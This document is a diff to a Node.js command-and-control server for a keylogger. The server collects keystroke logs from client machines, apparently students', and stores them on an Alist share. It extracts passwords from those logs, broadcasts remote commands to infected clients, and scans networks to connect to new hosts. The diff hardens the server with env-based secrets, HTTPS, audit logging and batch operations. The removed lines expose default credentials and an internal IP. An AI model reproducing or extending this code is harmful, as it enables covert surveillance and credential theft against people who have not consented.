@@ -1,5 +1,6 @@
 const express = require('express');
 const http = require('http');
+const https = require('https');
 const WebSocket = require('ws');
 const net = require('net');
 const path = require('path');
@@ -11,16 +12,51 @@ const jschardet = require('jschardet');
 const iconv = require('iconv-lite');
 const pLimit = require('p-limit');
 const winston = require('winston');
+const DailyRotateFile = require('winston-daily-rotate-file');
 const open = require('open');
 const crypto = require('crypto');
-require('dotenv').config();
+
+// 生成自签名证书的工具函数
+function generateSelfSignedCert() {
+    const { execSync } = require('child_process');
+    const certsDir = './certs';
+    
+    if (!fs.existsSync(certsDir)) {
+        fs.mkdirSync(certsDir, { recursive: true });
+    }
+    
+    const keyPath = path.join(certsDir, 'server.key');
+    const certPath = path.join(certsDir, 'server.crt');
+    
+    if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
+        try {
+            logger.info('生成自签名 SSL 证书...');
+            // 使用 OpenSSL 生成证书
+            execSync(`openssl req -x509 -newkey rsa:4096 -keyout "${keyPath}" -out "${certPath}" -days 365 -nodes -subj "/C=CN/ST=State/L=City/O=Organization/CN=localhost"`, { stdio: 'inherit' });
+            logger.info('SSL 证书生成完成');
+        } catch (error) {
+            logger.error('生成 SSL 证书失败，请手动安装 OpenSSL 或提供证书文件', { error: error.message });
+        }
+    }
+}
+
+// 加载环境变量
+require('dotenv').config({ path: '.env' });
 
 const AUTH_CONFIG = {
-    password: process.env.WEB_PASSWORD || 'adm1n5',
-    secret: process.env.WEB_AUTH_SECRET || 'keylogger_secret',
+    password: process.env.WEB_PASSWORD,
+    secret: process.env.WEB_AUTH_SECRET,
     cookieName: 'keylogger_auth',
     maxAge: 24 * 60 * 60 * 1000
 };
+
+// 检查必需的环境变量
+if (!AUTH_CONFIG.password) {
+    throw new Error('WEB_PASSWORD 环境变量必须设置');
+}
+if (!AUTH_CONFIG.secret) {
+    throw new Error('WEB_AUTH_SECRET 环境变量必须设置');
+}
 
 function parseCookies(cookieHeader = '') {
     return cookieHeader.split(';').reduce((cookies, cookie) => {
@@ -56,18 +92,18 @@ function verifyAuthToken(token) {
 // 配置常量
 const CONFIG = {
     alist: {
-        url: process.env.ALIST_URL || 'http://10.88.202.73:5244',
+        url: process.env.ALIST_URL,
         basePath: process.env.ALIST_BASE_PATH || '/学生目录/log',
-        username: process.env.ALIST_USERNAME || 'keylogger_server',
-        password: process.env.ALIST_PASSWORD || '114514',
+        username: process.env.ALIST_USERNAME,
+        password: process.env.ALIST_PASSWORD,
         tokenRefreshMargin: 5 * 60 * 1000,
     },
     db: {
         host: process.env.DB_HOST || 'localhost',
         port: parseInt(process.env.DB_PORT) || 3306,
-        user: process.env.DB_USER || 'log_manager',
-        password: process.env.DB_PASSWORD || '',
-        database: process.env.DB_NAME || 'client_logs',
+        user: process.env.DB_USER,
+        password: process.env.DB_PASSWORD,
+        database: process.env.DB_NAME,
         charset: 'utf8mb4',
         connectionLimit:100,
         queueLimit: 0,
@@ -89,6 +125,21 @@ const CONFIG = {
     logDir: './logs',
 };
 
+// 检查必需的环境变量
+const requiredEnvVars = [
+    'WEB_PASSWORD', 'WEB_AUTH_SECRET',
+    'ALIST_URL', 'ALIST_USERNAME', 'ALIST_PASSWORD',
+    'DB_USER', 'DB_PASSWORD', 'DB_NAME'
+];
+
+const missingVars = requiredEnvVars.filter(varName => !process.env[varName]);
+if (missingVars.length > 0) {
+    console.error('缺少必需的环境变量，请在 .env 文件中设置以下变量：');
+    missingVars.forEach(varName => console.error(`- ${varName}`));
+    console.error('\n或者创建 .env 文件并配置这些变量。');
+    process.exit(1);
+}
+
 // 初始化日志系统
 if (!fs.existsSync(CONFIG.logDir)) {
     fs.mkdirSync(CONFIG.logDir, { recursive: true });
@@ -104,8 +155,32 @@ const logger = winston.createLogger({
     ),
     defaultMeta: { service: 'log-manager' },
     transports: [
-        new winston.transports.File({ filename: path.join(CONFIG.logDir, 'error.log'), level: 'error' }),
-        new winston.transports.File({ filename: path.join(CONFIG.logDir, 'combined.log') }),
+        new DailyRotateFile({
+            filename: path.join(CONFIG.logDir, 'error-%DATE%.log'),
+            datePattern: 'YYYY-MM-DD',
+            level: 'error',
+            maxSize: '20m',
+            maxFiles: '14d'
+        }),
+        new DailyRotateFile({
+            filename: path.join(CONFIG.logDir, 'combined-%DATE%.log'),
+            datePattern: 'YYYY-MM-DD',
+            maxSize: '20m',
+            maxFiles: '14d'
+        }),
+        new DailyRotateFile({
+            filename: path.join(CONFIG.logDir, 'audit-%DATE%.log'),
+            datePattern: 'YYYY-MM-DD',
+            level: 'info',
+            maxSize: '20m',
+            maxFiles: '30d',
+            format: winston.format.combine(
+                winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
+                winston.format.printf(({ timestamp, level, message, user, action, ...meta }) => {
+                    return `${timestamp} [AUDIT] ${user || 'unknown'} - ${action || 'unknown'}: ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`;
+                })
+            )
+        }),
         new winston.transports.Console({
             format: winston.format.combine(
                 winston.format.colorize(),
@@ -116,6 +191,9 @@ const logger = winston.createLogger({
         })
     ],
 });
+
+// 审计日志记录器
+const auditLogger = logger.child({ type: 'audit' });
 
 // 辅助函数：统一异步错误处理
 const asyncHandler = (fn) => (req, res, next) => {
@@ -153,11 +231,16 @@ app.get('/login', (req, res) => {
 
 app.post('/api/login', asyncHandler(async (req, res) => {
     const { password } = req.body;
+    const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
+    
     if (password === AUTH_CONFIG.password) {
         const token = createAuthToken();
         res.setHeader('Set-Cookie', `${AUTH_CONFIG.cookieName}=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=${AUTH_CONFIG.maxAge / 1000}`);
+        auditLogger.info('用户登录成功', { user: 'admin', action: 'login', ip: clientIP });
         return res.json({ success: true });
     }
+    
+    auditLogger.warn('用户登录失败：密码错误', { user: 'unknown', action: 'login_failed', ip: clientIP });
     return res.status(401).json({ success: false, error: '密码错误' });
 }));
 
@@ -167,6 +250,20 @@ app.get('/logout', (req, res) => {
 });
 
 app.use(authMiddleware);
+
+// 用户信息中间件
+function userMiddleware(req, res, next) {
+    const cookies = parseCookies(req.headers.cookie || '');
+    const token = cookies[AUTH_CONFIG.cookieName];
+    if (token && verifyAuthToken(token)) {
+        req.user = 'admin'; // 简化版，实际可以从 token 中提取用户信息
+    } else {
+        req.user = 'anonymous';
+    }
+    next();
+}
+
+app.use(userMiddleware);
 app.use(express.static('public'));
 
 // Alist 客户端
@@ -1203,9 +1300,88 @@ app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res
         : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
     
     await alistClient.deleteFile(filePath);
-    logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId });
+    logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId, user: req.user || 'unknown' });
     
     res.json({ success: true, message: '文件已删除' });
+}));
+
+// 批量删除日志
+app.post('/api/batch/delete-logs', asyncHandler(async (req, res) => {
+    const { files } = req.body;
+    if (!Array.isArray(files)) {
+        return res.status(400).json({ error: 'files 必须是数组' });
+    }
+
+    const results = [];
+    const deleteLimit = pLimit(10); // 限制并发删除数
+
+    const deleteTasks = files.map(file => deleteLimit(async () => {
+        try {
+            const { clientId, filename } = file;
+            const clientInfo = getClientInfoById(clientId);
+            const safeFilename = path.basename(filename);
+            if (safeFilename !== filename) {
+                return { clientId, filename, success: false, error: '非法文件名' };
+            }
+
+            const filePath = filename.startsWith('passwords_') 
+                ? `${alistClient.basePath}/${filename}` 
+                : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
+
+            await alistClient.deleteFile(filePath);
+            auditLogger.info(`批量删除日志文件: ${filePath}`, { user: req.user, action: 'batch_delete_file', clientId, filename });
+            logger.info(`批量删除日志文件: ${filePath}`, { clientId, filename, user: req.user || 'unknown' });
+            return { clientId, filename, success: true };
+        } catch (error) {
+            auditLogger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { user: req.user, action: 'batch_delete_failed', error: error.message });
+            logger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { error: error.message, user: req.user || 'unknown' });
+            return { clientId: file.clientId, filename: file.filename, success: false, error: error.message };
+        }
+    }));
+
+    const taskResults = await Promise.allSettled(deleteTasks);
+    taskResults.forEach(result => {
+        if (result.status === 'fulfilled') {
+            results.push(result.value);
+        } else {
+            results.push({ success: false, error: result.reason.message });
+        }
+    });
+
+    const successCount = results.filter(r => r.success).length;
+    auditLogger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user, action: 'batch_delete_complete', total: files.length, successCount });
+    logger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user || 'unknown' });
+
+    res.json({
+        success: true,
+        total: files.length,
+        successCount,
+        results
+    });
+}));
+
+// 批量命令
+app.post('/api/batch/command', asyncHandler(async (req, res) => {
+    const { clientIds, command } = req.body;
+    if (!Array.isArray(clientIds) || !command) {
+        return res.status(400).json({ error: 'clientIds 必须是数组，且 command 必须提供' });
+    }
+
+    auditLogger.info(`批量命令执行: ${clientIds.length} 个客户端`, { user: req.user, action: 'batch_command', command: JSON.stringify(command), clientCount: clientIds.length });
+    logger.info(`批量命令执行: ${clientIds.length} 个客户端`, { command: JSON.stringify(command), user: req.user || 'unknown' });
+
+    const results = await clientManager.broadcastCommand(command);
+    const successCount = results.filter(r => r.success).length;
+
+    auditLogger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user, action: 'batch_command_complete', total: clientIds.length, successCount });
+    logger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user || 'unknown' });
+
+    res.json({
+        success: true,
+        total: clientIds.length,
+        successCount,
+        results
+    });
 }));
 
 app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
@@ -1218,8 +1394,19 @@ app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uplo
     const client = clientManager.clients.get(clientId);
     const logDir = client ? client.logDir : alistClient.basePath;
     const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
-    const result = await alistClient.uploadFile(logDir, filename, req.body.toString());
-    res.json(result);
+
+    // 异步上传文件，避免阻塞主线程
+    setImmediate(async () => {
+        try {
+            const result = await alistClient.uploadFile(logDir, filename, req.body.toString());
+            logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
+        } catch (error) {
+            logger.error(`文件上传失败: ${filename}`, { error: error.message, ip });
+        }
+    });
+
+    // 立即返回响应，不等待上传完成
+    res.json({ success: true, message: '文件上传已开始处理' });
 }));
 
 app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
@@ -1227,65 +1414,75 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         // 列出所有日志文件
         const allFiles = await alistClient.listFiles(alistClient.basePath);
         const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
-        
+
         if (logFiles.length === 0) {
             return res.json({ success: true, count: 0 });
         }
-        
-        // 提取密码
-        let extractedPasswords = [];
-        for (const file of logFiles) {
+
+        // 使用队列异步处理文件，避免阻塞主线程
+        const extractLimit = pLimit(20); // 限制并发数为20
+        const extractTasks = logFiles.map(file => extractLimit(async () => {
             try {
                 const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
                 const passwords = extractPasswordsFromLog(content, file.filename);
-                extractedPasswords = [...extractedPasswords, ...passwords];
+                return passwords;
             } catch (error) {
                 logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
+                return [];
             }
-        }
-        
+        }));
+
+        // 并行执行所有提取任务
+        const results = await Promise.allSettled(extractTasks);
+        let extractedPasswords = [];
+        results.forEach(result => {
+            if (result.status === 'fulfilled') {
+                extractedPasswords = [...extractedPasswords, ...result.value];
+            }
+        });
+
         if (extractedPasswords.length === 0) {
             return res.json({ success: true, count: 0 });
         }
-        
+
         // 去重：根据密码内容去重
         const uniquePasswords = [];
         const seenPasswords = new Set();
-        
+
         for (const item of extractedPasswords) {
             if (!seenPasswords.has(item.password)) {
                 seenPasswords.add(item.password);
                 uniquePasswords.push(item);
             }
         }
-        
+
         if (uniquePasswords.length === 0) {
             return res.json({ success: true, count: 0 });
         }
-        
+
         // 保存提取结果到本地文件
         const resultFilename = 'extracted_passwords.txt';
         const resultContent = uniquePasswords.map((item, index) => {
             return `${index + 1}. 来自: ${item.file}\n时间: ${item.timestamp}\n内容: ${item.password}\n原始数据: ${item.rawPassword}\n`;
         }).join('\n');
-        
+
         // 使用绝对路径确保文件路径正确
         const logsDir = path.join(__dirname, 'logs');
         const filePath = path.join(logsDir, resultFilename);
-        
+
         // 确保 logs 目录存在
         if (!fs.existsSync(logsDir)) {
             fs.mkdirSync(logsDir, { recursive: true });
             logger.info(`创建 logs 目录: ${logsDir}`);
         }
-        
-        // 写入本地文件
-        fs.writeFileSync(filePath, resultContent);
+
+        // 异步写入本地文件
+        await fs.promises.writeFile(filePath, resultContent);
         logger.info(`成功保存提取结果到: ${filePath}, 大小: ${resultContent.length} 字节`);
-        
-        res.json({ 
-            success: true, 
-            count: uniquePasswords.length 
+
+        res.json({
+            success: true,
+            count: uniquePasswords.length
         });
     } catch (error) {
         logger.error('提取密码失败', { error: error.message });
@@ -1471,9 +1668,136 @@ async function shutdown() {
 (async () => {
     try {
         await clientManager.init();
-        server.listen(CONFIG.httpPort, () => {
-            logger.info(`HTTP 服务运行在端口 ${CONFIG.httpPort}`);
-            const url = `http://localhost:${CONFIG.httpPort}/login.html`;
+        
+        const httpsEnabled = process.env.HTTPS_ENABLED === 'true';
+        let serverInstance = server;
+        let protocol = 'http';
+        let port = CONFIG.httpPort;
+        
+        if (httpsEnabled) {
+            const keyPath = process.env.HTTPS_KEY_PATH || './certs/server.key';
+            const certPath = process.env.HTTPS_CERT_PATH || './certs/server.crt';
+            
+            // 如果证书不存在，尝试生成自签名证书
+            if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
+                generateSelfSignedCert();
+            }
+            
+            if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
+                const key = fs.readFileSync(keyPath);
+                const cert = fs.readFileSync(certPath);
+                const credentials = { key, cert };
+                serverInstance = https.createServer(credentials, app);
+                protocol = 'https';
+                logger.info('HTTPS 模式已启用');
+            } else {
+                logger.warn('HTTPS 证书文件不存在，将使用 HTTP 模式');
+                logger.warn(`请将证书文件放置在 ${keyPath} 和 ${certPath}`);
+            }
+        }
+        
+        // 重新创建 WebSocket 服务器以使用 HTTPS 服务器
+        const wssInstance = new WebSocket.Server({ server: serverInstance });
+        
+        // 重新绑定 WebSocket 事件处理
+        wssInstance.on('connection', (ws, req) => {
+            const cookies = parseCookies(req.headers.cookie || '');
+            if (!verifyAuthToken(cookies[AUTH_CONFIG.cookieName])) {
+                logger.warn('拒绝未授权的 WebSocket 连接');
+                ws.close(1008, 'Unauthorized');
+                return;
+            }
+
+            logger.info('Web 客户端已连接');
+            clientManager.addWebClient(ws);
+
+            ws.on('message', async (message) => {
+                try {
+                    const data = JSON.parse(message);
+                    switch (data.type) {
+                        case 'command':
+                            const result = await clientManager.sendCommand(data.clientId, data.command);
+                            ws.send(JSON.stringify({ type: 'command_result', result }));
+                            break;
+
+                        case 'broadcast_command':
+                            const results = await clientManager.broadcastCommand(data.command);
+                            ws.send(JSON.stringify({ type: 'broadcast_result', results }));
+                            break;
+
+                        case 'scan_network':
+                            try {
+                                const found = await clientManager.scanNetwork(
+                                    data.startIp,
+                                    data.endIp,
+                                    data.ports || CONFIG.scanPorts
+                                );
+                                ws.send(JSON.stringify({ type: 'scan_complete', found }));
+                            } catch (e) {
+                                ws.send(JSON.stringify({ type: 'scan_error', message: e.message }));
+                            }
+                            break;
+
+                        case 'manual_connect':
+                            try {
+                                const client = await clientManager.manualConnect(data.ip, data.port);
+                                if (client) {
+                                    ws.send(JSON.stringify({ type: 'connect_result', client }));
+                                } else {
+                                    ws.send(JSON.stringify({ 
+                                        type: 'connect_error', 
+                                        message: `无法连接到 ${data.ip}:${data.port}，请检查目标主机是否在线且端口可访问` 
+                                    }));
+                                }
+                            } catch (e) {
+                                ws.send(JSON.stringify({ type: 'connect_error', message: e.message }));
+                            }
+                            break;
+
+                        case 'disconnect_client':
+                            const client = clientManager.clients.get(data.clientId);
+                            if (client) {
+                                client.socket.end();
+                                clientManager.clients.delete(data.clientId);
+                            }
+                            ws.send(JSON.stringify({ type: 'disconnected', clientId: data.clientId }));
+                            break;
+
+                        case 'delete_client':
+                            try {
+                                await clientManager.deleteKnownClient(data.clientId);
+                                ws.send(JSON.stringify({
+                                    type: 'delete_result',
+                                    success: true,
+                                    clientId: data.clientId
+                                }));
+                            } catch (e) {
+                                ws.send(JSON.stringify({
+                                    type: 'delete_result',
+                                    success: false,
+                                    clientId: data.clientId,
+                                    error: e.message
+                                }));
+                            }
+                            break;
+
+                        default:
+                            ws.send(JSON.stringify({ type: 'error', message: '未知的命令类型' }));
+                    }
+                } catch (e) {
+                    ws.send(JSON.stringify({ type: 'error', message: e.message }));
+                }
+            });
+
+            ws.on('close', () => {
+                logger.info('Web 客户端已断开');
+                clientManager.removeWebClient(ws);
+            });
+        });
+        
+        serverInstance.listen(port, () => {
+            logger.info(`${protocol.toUpperCase()} 服务运行在端口 ${port}`);
+            const url = `${protocol}://localhost:${port}/login.html`;
             logger.info(`访问 ${url} 打开管理界面`);
         });
     } catch (err) {
